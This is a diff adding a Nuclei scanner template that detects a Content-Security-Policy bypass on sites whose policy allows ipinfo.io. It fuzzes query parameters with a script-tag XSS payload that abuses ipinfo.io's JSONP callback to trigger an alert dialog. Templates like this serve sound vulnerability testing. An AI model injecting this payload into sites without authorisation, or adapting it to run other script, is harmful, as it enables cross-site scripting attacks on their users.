@@ -1,0 +1,55 @@
+id: ipinfo-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - IPInfo
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ipinfo
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ipinfo.io"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ipinfo_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://ipinfo.io/?format=jsonp&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ipinfo_csp_xss == true"
+# digest: 4a0a0047304502201ebfbedc86c1adbd5c0bb9e657960e6e5c2e0c6ccd90e18fcb0c5301d00fe6a7022100a587da5bbbfb411fee5885403c4984e0a85e141647cf58c97725861131e4c583:922c64590222798bb761d5b6d8e72950
